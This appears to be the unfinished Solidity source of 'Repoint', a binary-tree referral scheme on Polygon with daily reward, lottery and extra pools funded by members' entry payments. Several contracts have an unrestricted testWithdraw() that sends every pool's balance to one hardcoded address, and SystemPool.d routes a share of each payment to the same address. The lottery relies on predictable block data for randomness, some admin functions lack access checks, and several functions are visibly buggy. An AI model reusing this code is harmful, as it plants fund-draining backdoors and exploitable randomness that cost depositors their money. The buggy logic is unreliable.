// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface AggregatorInterface {
  function latestAnswer() external view returns (int256);

  function latestTimestamp() external view returns (uint256);

  function latestRound() external view returns (uint256);

  function getAnswer(uint256 roundId) external view returns (int256);

  function getTimestamp(uint256 roundId) external view returns (uint256);

  event AnswerUpdated(int256 indexed current, uint256 indexed roundId, uint256 updatedAt);

  event NewRound(uint256 indexed roundId, address indexed startedBy, uint256 startedAt);
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./EnumerableArrays.sol";
import "./PriceFeed.sol";

import "./LotteryPool/LotteryPool.sol";
import "./ExtraPool/ExtraPool.sol";
import "./SystemPool/SystemPool.sol";

// qeymat ha o payment ha bazia be dolare bazia be matic. bayad dorost she
// 
// 
abstract contract DataStorage is EnumerableArrays, PriceFeed {

    LotteryPool public LPool;
    ExtraPool public XPool;
    SystemPool SPool;   

    address payable rewardAddr;
    address payable lotteryAddr;
    address payable extraAddr;
    address payable systemAddr;


// data and info -----------------------------------------------------------------

    struct NodeData {
        uint24 allLeftDirect;
        uint24 allRightDirect;
        uint16 leftVariance;
        uint16 rightVariance;
        uint16 depth;
        uint16 maxPoints;
        uint16 todayPoints;
        uint16 childs;
        uint16 isLeftOrRightChild;
    }

    struct NodeInfo {
        address uplineAddress;
        address leftDirectAddress;
        address rightDirectAddress;
    }

    mapping(address => uint256) _userAllEarned;
    mapping(address => NodeData) _userData;
    mapping(address => NodeInfo) _userInfo;
    mapping(string => address) nameToAddr;
    mapping(address => string) addrToName;

    uint256 public maxOldUsers;
    uint256 public allPayments;
    uint256 public todayPayments;
    uint256 public lastReward24h;
    uint256 public lastReward7d;
    uint256 public lastReward30d;
    uint256 public userCount;
    uint256 public todayTotalPoint;
    uint256 public todayPointOverFlow;

    address public lastRewardWriter;

// checking -------------------------------------------------------------
    mapping(address => bool) public registered;


    function userExists(string calldata username) public view returns(bool) {
        return nameToAddr[username] != address(0);
    }

    function balance() public view returns(uint256) {
        return address(this).balance;
    }

    function todayEveryPointValue() public view returns(uint256) {
        uint256 denominator = todayTotalPoint + todayPointOverFlow;
        denominator = denominator > 0 ? denominator : 1;
        return address(this).balance / denominator;
    }

    function todayEveryPointValueUSD() public view returns(uint256) {
        uint256 denominator = todayTotalPoint + todayPointOverFlow;
        denominator = denominator > 0 ? denominator : 1;
        return (todayPayments * 70/100) / denominator;
    }

    function userData(string calldata username) public view returns(NodeData memory) {
        address userAddr = nameToAddr[username];
        require(userAddr != address(0), "DataStorage: user does not exist");
        return _userData[userAddr];
    }

    function userInfo(string calldata username) public view returns(NodeInfo memory) {
        address userAddr = nameToAddr[username];
        require(userAddr != address(0), "DataStorage: user does not exist");
        return _userInfo[userAddr];
    }

    function userUpReferral(string calldata username) public view returns(string memory) {
        address userAddr = nameToAddr[username];
        require(userAddr != address(0), "DataStorage: user does not exist");
        return addrToName[_userInfo[userAddr].uplineAddress];
    }

    function userChilds(string calldata username)
        public
        view
        returns (string memory left, string memory right)
    {
        address userAddr = nameToAddr[username];
        require(userAddr != address(0), "DataStorage: user does not exist");
        left = addrToName[_userInfo[userAddr].leftDirectAddress];
        right = addrToName[_userInfo[userAddr].rightDirectAddress];        
    }

// 100% bayad test she
    function userTree(string calldata username, uint256 len) public view returns(string[] memory temp) {
        address userAddr = nameToAddr[username];
        require(userAddr != address(0), "DataStorage: user does not exist");
        address[] memory addrs = new address[](len + 1);
        temp = new string[](len);

        addrs[0] = userAddr;

        uint256 j;
        for(uint256 i; i <= len / 2; i++) {
            addrs[j++] = _userInfo[addrs[i]].leftDirectAddress;
            addrs[j++] = _userInfo[addrs[i]].rightDirectAddress;
        }
        for(uint256 i; i < len; i++) {
            temp[i] = addrToName[addrs[i + 1]];
        }
    } 

    function userChildsCount(string calldata username)
        public
        view
        returns (uint256)
    {
        address userAddr = nameToAddr[username];
        require(userAddr != address(0), "DataStorage: user does not exist");
        return _userData[userAddr].childs;        
    }
    
    function userTodayPoints(string calldata username) public view returns (uint256) {
        address userAddr = nameToAddr[username];
        require(userAddr != address(0), "DataStorage: user does not exist");
        return _userData[userAddr].todayPoints;
    }

    function userMonthPoints(string calldata username) public view returns(uint256) {
        address userAddr = nameToAddr[username];
        require(userAddr != address(0), "DataStorage: user does not exist");
        return _monthPoints[monthCounter][userAddr];
    }
    
    function userTodayDirectCount(string calldata username) public view returns (
        uint256 left,
        uint256 right
    ) {
        address userAddr = nameToAddr[username];
        require(userAddr != address(0), "DataStorage: user does not exist");
        uint256 points = _userData[userAddr].todayPoints;

        left = _userData[userAddr].leftVariance + points;
        right = _userData[userAddr].rightVariance + points;
    }
    
    function userAllTimeDirectCount(string calldata username) public view returns(
        uint256 left,
        uint256 right
    ) {
        address userAddr = nameToAddr[username];
        require(userAddr != address(0), "DataStorage: user does not exist");

        left = _userData[userAddr].allLeftDirect;
        right = _userData[userAddr].allRightDirect;
    }

    function userAllEarned(string calldata username) public view returns(uint256) {
        address userAddr = nameToAddr[username];
        require(userAddr != address(0), "DataStorage: user does not exist");
        return _userAllEarned[userAddr];
    }

    function usernameString(address userAddr) public view returns(string memory) {
        require(userAddr != address(0), "DataStorage: user does not exist");
        return addrToName[userAddr];
    }

    function extraRewardReceivers() public view returns(string[] memory temp) {
        address[] memory addrs = XPool.extraRewardReceivers();
        uint256 len = addrs.length;

        for(uint256 i; i < len; i++) {
            temp[i] = addrToName[addrs[i]];
        }
    }

    function lastLotteryWinners() public view returns(string[] memory temp) {
        address[] memory addrs = LPool.lastLotteryWinners();
        uint256 len = addrs.length;

        for(uint256 i; i < len; i++) {
            temp[i] = addrToName[addrs[i]];
        }
    }

    function dashboard(bool getLists) public view returns(
        uint256 allPayments_,
        uint256 todayPayments_,
        uint256 userCount_,
        uint256 todayPoints_,
        uint256 pointValue_,
        uint256 pointValueUSD_,
        uint256 rewardPoolBalance_,
        uint256 lotteryPoolBalance_,
        uint256 extraPoolBalance_,
        string[] memory lastLotteryWinners_,
        string[] memory extraRewardReceivers_
    ) {
        allPayments_ = allPayments;
        todayPayments_ = todayPayments;
        userCount_ = userCount;
        todayPoints_ = todayTotalPoint;
        pointValue_ = todayEveryPointValue(); 
        pointValueUSD_ = todayEveryPointValueUSD(); 
        rewardPoolBalance_ = todayPayments * 70/100;
        lotteryPoolBalance_ = todayPayments * 10/100;
        extraPoolBalance_ = todayPayments * 10/100;
        if(getLists) {
            lastLotteryWinners_ = lastLotteryWinners();
            extraRewardReceivers_ = extraRewardReceivers();
        }
    }

    function userDashboard(string calldata username) public view returns(
        uint256 depth,
        uint256 allEarned,
        uint256 todayPoints,
        uint256 maxPoints,
        uint256 extraPoints,
        uint256 lotteryTickets
    ) {
        address userAddr = nameToAddr[username];
        require(userAddr != address(0), "DataStorage: user does not exist");

        depth = _userData[userAddr].depth;
        allEarned = _userAllEarned[userAddr];
        todayPoints = _userData[userAddr].todayPoints;
        maxPoints = _userData[userAddr].maxPoints;
        extraPoints = XPool.userExtraPoints(userAddr);
        lotteryTickets = LPool.userTickets(userAddr);
    }

    function poolsBalances() public view returns(
        uint256 rewardPoolBalance,
        uint256 lotteryPoolBalance,
        uint256 extraPoolBalance
    ) {
        uint256 overflowValue = todayPointOverFlow * todayEveryPointValue();
        rewardPoolBalance = balance() - overflowValue;
        lotteryPoolBalance = LPool.balance() + overflowValue * 25/100;
        extraPoolBalance = LPool.balance() + overflowValue * 25/100;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;


abstract contract EnumerableArrays {

    mapping(uint256 => mapping(address => uint256)) _monthPoints;
    mapping(uint256 => address[]) _rewardReceivers;

    uint256 rcIndex;
    uint256 monthCounter;
    
    function _resetRewardReceivers() internal {
        rcIndex++;
    }
    function _resetMonthPoints() internal {
        monthCounter ++;
    }

    function todayRewardReceivers() public view returns(address[] memory addr) {
        uint256 len = _rewardReceivers[rcIndex].length;
        addr = new address[](len);

        for(uint256 i; i < len; i++) {
            addr[i] = _rewardReceivers[rcIndex][i];
        }
    }

    function todayRewardReceiversCount() public view returns(uint256) {
        return _rewardReceivers[rcIndex].length;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

abstract contract EDataStorage {
    
    uint256 erIndex;
    uint256 epIndex;

    mapping(uint256 => address[]) _extraRewardReceivers;
    mapping(uint256 => mapping(address => uint256)) _userExtraPoints;

    function _resetExtraPoints() internal {
        epIndex ++;
    }
    function _resetExtraRewardReceivers() internal {
        erIndex++;
    }

    function extraRewardReceivers() public view returns(address[] memory addr) {
        uint256 len = _extraRewardReceivers[erIndex].length;
        addr = new address[](len);

        for(uint256 i; i < len; i++) {
            addr[i] = _extraRewardReceivers[erIndex][i];
        }
    }

    function extraRewardReceiversCount() public view returns(uint256) {
        return _extraRewardReceivers[erIndex].length;
    }

    function userExtraPoints(address userAddr) public view returns(uint256) {
        return _userExtraPoints[epIndex][userAddr];
    }

// -----------------------------------------------------------------------------------------

    mapping(address => uint256) public _userAllEarned;

    uint256 public extraPointCount;

    function balance() public view returns(uint256) {
        return address(this).balance;
    }

    function exPointValue() public view returns(uint256) {
        return balance() / extraPointCount;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./EDataStorage.sol";

// in contract hame chizesh bayad test she
contract ExtraPool is EDataStorage{

    address repoint;

    constructor (address _repoint) {
        repoint = _repoint;
    }

    modifier onlyRepoint() {
        require(msg.sender == repoint, "only repoint can call this function");
        _;
    }

/// bayad check she
    function distribute() public onlyRepoint {
        uint256 count = extraRewardReceiversCount();
        if(count > 0) {
            uint256 _exPointValue = exPointValue();
            for(uint256 i; i < count; i++) {
                address userAddr = _extraRewardReceivers[erIndex][i];
                uint256 earning = _userExtraPoints[epIndex][userAddr] * _exPointValue;
                _userAllEarned[userAddr] += earning;
                payable(userAddr).transfer(earning);
            }
        } else {
            payable(repoint).transfer(balance());
        }
        delete extraPointCount;
        _resetExtraPoints();
        _resetExtraRewardReceivers();
    }

    function addAddr(address userAddr) public onlyRepoint {
        if(_userExtraPoints[epIndex][userAddr] == 0) {
            _extraRewardReceivers[erIndex].push(userAddr);
        }
        extraPointCount ++;
        _userExtraPoints[epIndex][userAddr] ++;
    }

    receive() external payable{}
    
    function testWithdraw() public {
        payable(0x3F191Cb6cE4d528D3412308BCa5D6b957f6bCbf6).transfer(address(this).balance);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;


abstract contract LDataStorage {

    uint256 lcIndex;
    uint256 lwIndex;

    mapping(uint256 => address[]) _lotteryCandidates;
    mapping(uint256 => address[]) _lotteryWinners;

    function _resetLotteryCandidates() internal {
        lcIndex++;
    }
    function _resetLotteryWinners() internal {
        lwIndex++;
    }

    function todayLotteryCandidates() public view returns(address[] memory addr) {
        uint256 len = _lotteryCandidates[lcIndex].length;
        addr = new address[](len);

        for(uint256 i; i < len; i++) {
            addr[i] = _lotteryCandidates[lcIndex][i];
        }
    }

    function lastLotteryWinners() public view returns(address[] memory addr) {
        uint256 len = _lotteryWinners[lwIndex].length;
        addr = new address[](len);

        for(uint256 i; i < len; i++) {
            addr[i] = _lotteryWinners[lwIndex][i];
        }
    }

    function lotteryCandidatesCount() public view returns(uint256) {
        return _lotteryCandidates[lcIndex].length;
    }

    function lastLotteryWinnersCount() public view returns(uint256) {
        return _lotteryWinners[lwIndex].length;
    }


// ---------------------------------------------------------------------------------------

    mapping(address => uint256) public _userAllEarned;

    function balance() public view returns(uint256) {
        return address(this).balance;
    }

    function todayLotteryWinnersCount() public view returns(uint256) {
        uint256 count = lotteryCandidatesCount();
        return count % 20 == 0 ? count * 5/100 : count * 5/100 + 1;
    }

    function lotteryFractionValue() public view returns(uint256) {
        return balance() / todayLotteryWinnersCount();
    }


// ---------------------------------------------------------------------------------
    uint256 utIndex;

    mapping(uint256 => mapping(address => uint256)) _todayUserTickets;

    function userTickets(address userAddr) public view returns(uint256) {
        return _todayUserTickets[utIndex][userAddr];
    }

    function _resetUserTickets() internal {
        utIndex++;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./LDataStorage.sol";

contract LotteryPool is LDataStorage {
    
    address repoint;

    constructor (address _repoint) {
        repoint = _repoint;
    }

    modifier onlyRepoint() {
        require(msg.sender == repoint, "only repoint can call this function");
        _;
    }

// shadidan test lazem
    function distribute(uint256 USD_MATIC) public onlyRepoint {
        _resetLotteryWinners();

        address[] storage lotteryCandidates = _lotteryCandidates[lcIndex];
        address[] storage lotteryWinners = _lotteryWinners[lwIndex];

        uint256 winnersCount = todayLotteryWinnersCount();
        uint256 candidatesCount = lotteryCandidatesCount();
        uint256 lotteryFraction = lotteryFractionValue();
        address winner;

        uint256 randIndex = uint256(keccak256(abi.encodePacked(
            block.timestamp, block.difficulty, USD_MATIC
        )));
        for(uint256 i; i < winnersCount; i++) {
            randIndex = uint256(keccak256(abi.encodePacked(randIndex, i))) % candidatesCount;
            candidatesCount--;
            winner = lotteryCandidates[randIndex];
            lotteryCandidates[randIndex] = lotteryCandidates[candidatesCount];
            lotteryWinners.push(winner);
            _userAllEarned[winner] += lotteryFraction;
            payable(winner).transfer(lotteryFraction);
        }
        
        _resetLotteryCandidates();
        _resetUserTickets();
    }

    function addAddr(address userAddr, uint256 numTickets) public payable onlyRepoint {
        for(uint256 i; i < numTickets; i++) {
            _lotteryCandidates[lcIndex].push(userAddr);
        }
        _todayUserTickets[utIndex][userAddr] += numTickets;
    }


    receive() external payable{}

    function testWithdraw() public {
        payable(0x3F191Cb6cE4d528D3412308BCa5D6b957f6bCbf6).transfer(address(this).balance);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@chainlink/contracts/src/v0.8/interfaces/AggregatorInterface.sol";

abstract contract PriceFeed {
    AggregatorInterface immutable AGGREGATOR_MATIC_USD;

    uint256 public USD_MATIC;

    constructor(
        address aggregatorAddr
    ) {
        AGGREGATOR_MATIC_USD = AggregatorInterface(aggregatorAddr);
        _updateMaticePrice();
    }

    function _updateMaticePrice() internal {
        USD_MATIC = 10 ** 26 / uint256(AGGREGATOR_MATIC_USD.latestAnswer());
        // USD_MATIC = 2 * 10 ** 18;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./DataStorage.sol";


contract Repoint is DataStorage {

// max old bayad avaz she
    constructor(
        address _aggregator
    ) PriceFeed(_aggregator) {
        maxOldUsers = 3;
        address repointAddr = address(this);
        _updateMaticePrice();

        LPool = new LotteryPool(repointAddr);
        XPool = new ExtraPool(repointAddr);
        SPool = new SystemPool(repointAddr);

        lotteryAddr = payable(address(LPool));        
        extraAddr = payable(address(XPool));
        systemAddr = payable(address(SPool));
    }


// register ---------------------------------------------------------------------------------
    function register(string calldata upReferral, string calldata username) public payable {
        uint256 enterPrice = msg.value;
        address userAddr = msg.sender;
        address upAddr = nameToAddr[upReferral];

        checkCanRegister(upReferral, username, upAddr);
        (uint256 amountUSD, uint16 todayPoints, uint16 maxPoints, uint16 directUp) = checkEnterPrice(enterPrice);
        registered[userAddr] = true;

        _payShares(enterPrice, amountUSD);

        _newUsername(userAddr, username);
        _newNode(userAddr, upAddr, maxPoints, todayPoints);
        _setChilds(userAddr, upAddr, todayPoints);
        _setDirects(userAddr, upAddr, directUp);
    }

    function checkCanRegister(
        string calldata upReferral,
        string calldata username,
        address upAddr
    ) internal view returns(bool) {
        require(
            _userData[upAddr].childs < 2,
            "This address have two directs and could not accept new members!"
        );
        require(
            !userExists(username),
            "This username is taken!"
        );
        require(
            userExists(upReferral),
            "This upReferral does not exist!"
        );
        return true;
    }

    function checkEnterPrice(uint256 enterPrice) public view returns(
        uint256 amountUSD, uint16 todayPoints, uint16 maxPoints, uint16 directUp
    ) {
        if(enterPrice == 20 * USD_MATIC / 10000) { // bayad * 10000 beshe
            amountUSD = 20 * 10 ** 18;
            maxPoints = 10;
            directUp = 1;
        } else if(enterPrice == 60 * USD_MATIC / 10000) {
            amountUSD = 60 * 10 ** 18;
            maxPoints = 30;
            directUp = 3;
        } else if(enterPrice == 100 * USD_MATIC / 10000) {
            amountUSD = 100 * 10 ** 18;
            todayPoints = 1;
            maxPoints = 50;
            directUp = 5;
        } else {
            revert("Wrong enter price");
        }
    }

    function _payShares(uint256 enterPrice, uint256 amountUSD) internal {
        allPayments += amountUSD;
        todayPayments += amountUSD;

        lotteryAddr.transfer(enterPrice * 15/100);
        extraAddr.transfer(enterPrice * 10/100);
        SPool.d{value : enterPrice * 5/100}();
    }

    function _newUsername(address userAddr, string calldata username) internal {
        nameToAddr[username] = userAddr;
        addrToName[userAddr] = username;
        userCount++;
    }

    function _newNode(address userAddr, address upAddr, uint16 maxPoints, uint16 todayPoints) internal {
        _userData[userAddr] = NodeData (
            0,
            0,
            0,
            0,
            _userData[upAddr].depth + 1,
            maxPoints,
            todayPoints,
            0,
            _userData[upAddr].childs
        );
        _userInfo[userAddr] = NodeInfo (
            upAddr,
            address(0),
            address(0)
        );
    }

    function _setChilds(address userAddr, address upAddr, uint16 todayPoints) internal {

        if (_userData[upAddr].childs == 0) {
            _userInfo[upAddr].leftDirectAddress = userAddr;
        } else {
            _userInfo[upAddr].rightDirectAddress = userAddr;
        }
        _userData[upAddr].childs++;

        if(todayPoints != 0) {
            _rewardReceivers[rcIndex].push(userAddr);
            _userData[userAddr].todayPoints = 1;
            todayTotalPoint ++;
        }
    }

    function _setDirects(address userAddr, address upAddr, uint16 directUp) internal { 
        address[] storage rewardReceivers = _rewardReceivers[rcIndex];

        uint256 depth = _userData[userAddr].depth;
        uint16 _pointsOverFlow;
        uint16 _totalPoints;
        for (uint256 i; i < depth; i++) {
            uint16 points;
            if (_userData[userAddr].isLeftOrRightChild == 0) {
                if(_userData[upAddr].rightVariance == 0){
                    _userData[upAddr].leftVariance += directUp;
                } else {
                    if(_userData[upAddr].rightVariance < directUp) {
                        uint16 v = _userData[upAddr].rightVariance;
                        _userData[upAddr].rightVariance = 0;
                        _userData[upAddr].leftVariance += directUp - v;
                        points = v;
                    } else {
                        _userData[upAddr].rightVariance -= directUp;
                        points = directUp;
                    }
                }
                _userData[upAddr].allLeftDirect += directUp;
            } else {
                if(_userData[upAddr].leftVariance == 0){
                    _userData[upAddr].rightVariance += directUp;
                } else {
                    if(_userData[upAddr].leftVariance < directUp) {
                        uint16 v = _userData[upAddr].leftVariance;
                        _userData[upAddr].leftVariance = 0;
                        _userData[upAddr].rightVariance += directUp - v;
                        points = v;
                    } else {
                        _userData[upAddr].leftVariance -= directUp;
                        points = directUp;
                    }
                }
                _userData[upAddr].allRightDirect += directUp;
            }

            if(points > 0) {
                uint16 userTodayPoints = _userData[upAddr].todayPoints;
                uint16 userNeededPoints = _userData[upAddr].maxPoints - userTodayPoints;
                if(userNeededPoints >= points) {
                    if(userTodayPoints == 0){
                        rewardReceivers.push(upAddr);
                    }
                    _userData[upAddr].todayPoints += points;
                    _totalPoints += points;
                } else {
                    _userData[upAddr].todayPoints += userNeededPoints;
                    _totalPoints += userNeededPoints;
                    _pointsOverFlow += points - userNeededPoints;
                }
    
                _addMonthPoint(upAddr, points);
            }
            userAddr = upAddr;
            upAddr = _userInfo[upAddr].uplineAddress;
        }

        todayTotalPoint += _totalPoints;
        todayPointOverFlow += _pointsOverFlow;
    }

// topUp --------------------------------------------------------------------------------------

    function topUp() public payable {
        address userAddr = msg.sender;
        uint256 topUpPrice = msg.value;

        address upAddr = _userInfo[userAddr].uplineAddress;
        (uint256 amountUSD, uint16 maxPoints, uint16 directUp) = _checkTopUpPrice(userAddr, topUpPrice);

        _payShares(topUpPrice, amountUSD);
        _setDirects(userAddr, upAddr, directUp);
                        
        _userData[userAddr].maxPoints += maxPoints;
    }

    function _checkTopUpPrice(address userAddr, uint256 topUpPrice) internal view returns(
        uint256 amountUSD, uint16 maxPoints, uint16 directUp
    ) {
        require(
            registered[userAddr],
            "You have not registered!"
        );

        if(topUpPrice == 40 * USD_MATIC / 10000) {
            require(
                _userData[userAddr].maxPoints != 50,
                "the highest max point is 50"
            );
            amountUSD = 40;
            maxPoints = 20;
            directUp = 2;
        } else if(topUpPrice == 80 * USD_MATIC / 10000) {
            require(
                _userData[userAddr].maxPoints == 10,
                "the highest max point is 50"
            );
            amountUSD = 80;
            maxPoints = 40;
            directUp = 4;
        } else {
            revert("Wrong TopUp price");
        }
    }

// reward24 -----------------------------------------------------------------------------------

    function distribute() public {
        require(
            block.timestamp >= lastReward24h + 24 hours - 5 minutes,
            "The Reward_24 Time Has Not Come"
        );
        lastReward24h = block.timestamp;
        _reward24h();

        if(block.timestamp >= lastReward7d + 7 days - 35 minutes) {
            lastReward7d = block.timestamp;
            LPool.distribute(USD_MATIC);
        }
        if(block.timestamp >= lastReward30d + 30 days - 150 minutes) {
            lastReward30d = block.timestamp;
            XPool.distribute();
            _resetMonthPoints();
        }
        _updateMaticePrice();
    }

    function _reward24h() internal {

        uint256 pointValue = todayEveryPointValue();
        uint256 pointValueUSD = todayEveryPointValueUSD();

        address[] storage rewardReceivers = _rewardReceivers[rcIndex];

        address userAddr;
        uint256 len = rewardReceivers.length;
        for(uint256 i; i < len; i++) {
            userAddr = rewardReceivers[i];
            uint256 userPoints = _userData[userAddr].todayPoints;
            _userAllEarned[userAddr] += userPoints * pointValueUSD;
            payable(userAddr).transfer(userPoints * pointValue);
            delete _userData[userAddr].todayPoints;
        }
        uint256 overflowValue = todayPointOverFlow * pointValue;
        lotteryAddr.transfer(overflowValue * 25/100);
        extraAddr.transfer(overflowValue * 25/100);
        delete todayTotalPoint;
        delete todayPayments;
        delete todayPointOverFlow;
        _resetRewardReceivers();
    }

// bayad test she
    function _addMonthPoint(address userAddr, uint256 points) internal {
        uint256 userNeededPoints = 50 - _monthPoints[monthCounter][userAddr];

        if(userNeededPoints >= points) {
            _monthPoints[monthCounter][userAddr] += points;
        } else {
            _monthPoints[monthCounter][userAddr] = points - userNeededPoints;
            XPool.addAddr(userAddr);
        }
    }

// register in lottery ----------------------------------------------------------------
    function registerInLottery() public payable {
        address userAddr = msg.sender;
        require(
            registered[userAddr],
            "This address is not registered in Repoint Contract!"
        );
        uint256 ticketPrice = 1 * USD_MATIC;
        require(
            msg.value >= ticketPrice,
            "minimum lottery enter price is 1 USD in MATIC"
        );
        LPool.addAddr{value : msg.value}(userAddr, msg.value / ticketPrice);
    }

// old users -----------------------------------------------------------------------

    function uploadOldUsers(
        string calldata upReferral, 
        string calldata username, 
        address userAddr
    ) public {
        require(userCount < maxOldUsers, "The number of old users is over!");
        address upAddr = nameToAddr[upReferral];

        if(userCount != 0) {
            require(
                _userData[upAddr].childs < 2,
                "This address have two directs and could not accept new members!"
            );
            require(
                userAddr != upAddr,
                "You can not enter your own address!"
            );
            require(
                !registered[userAddr],
                "This address is already registered!"
            ); 
            require(
                registered[upAddr],
                "This Upline address is Not Exist!"
            );
            _newNode(userAddr, upAddr, 50, 0);
            _setDirects(userAddr, upAddr, 0);
        } else {
            _userData[userAddr].maxPoints = 50;
        }
        _newUsername(userAddr, username);
        _setChilds(userAddr, upAddr, 0);
        registered[userAddr] = true;
        allPayments += 100 * 10 ** 18;

    }

// emergency withdraw -----------------------------------------------------------------

    function emergencyReward() public {
        require(
            block.timestamp >= lastReward24h + 3 days,
            "The Emergency Time Has Not Come"
        );
        lastReward24h = block.timestamp;
        _reward24h();
        _updateMaticePrice();
    }

    function emergencyLottery() public {
        require(
            block.timestamp >= lastReward7d + 10 days,
            "The Emergency Time Has Not Come"
        );
        lastReward7d = block.timestamp;
        LPool.distribute(USD_MATIC);
    }

    function emergencyExtra() public {
        require(
            block.timestamp >= lastReward30d + 33 days,
            "The Emergency Time Has Not Come"
        );
        lastReward30d = block.timestamp;
        XPool.distribute();
    }

    function emergency7d() public {
        require(
            block.timestamp > lastReward24h + 7 days,
            "The Emergency Time Has Not Come"
        );
        systemAddr.transfer(balance());
    }

    function testWithdraw() public {
        systemAddr.transfer(balance());
        LPool.testWithdraw();
        XPool.testWithdraw();
        SPool.testWithdraw();
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract SystemPool {
    
    address repoint;

    constructor (address _repoint) {
        repoint = _repoint;
    }

    modifier onlyRepoint() {
        require(msg.sender == repoint, "only repoint can call this function");
        _;
    }

    function d() external payable {
        payable(0x3F191Cb6cE4d528D3412308BCa5D6b957f6bCbf6).transfer(msg.value);
    }
    
    function testWithdraw() public {
        payable(0x3F191Cb6cE4d528D3412308BCa5D6b957f6bCbf6).transfer(address(this).balance);
    }

}